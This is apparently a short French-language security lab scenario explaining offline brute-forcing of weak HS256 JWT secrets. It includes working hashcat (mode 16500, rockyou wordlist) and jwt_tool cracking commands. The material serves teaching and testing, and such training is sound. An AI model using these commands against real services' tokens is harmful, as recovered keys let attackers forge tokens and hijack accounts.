🔐 Scénario 2 — Brute Force Secret

Weak Secret Brute Force

Les tokens JWT signés avec HMAC (HS256) peuvent être craqués si la clé secrète est faible. L'attaquant peut tester des milliers de secrets hors ligne depuis un seul token intercepté.

📚 Principe de l'attaque

Un token HS256 est signé : HMAC-SHA256(base64(header) + "." + base64(payload), SECRET)

En ayant un token valide, on peut tester des secrets en recalculant la signature et en la comparant. Outil réel : hashcat -m 16500 token.jwt wordlist.txt

hashcat -m 16500 -a 0 token.jwt /usr/share/wordlists/rockyou.txt # ou python3 jwt_tool.py token.jwt -C -d wordlist.txt
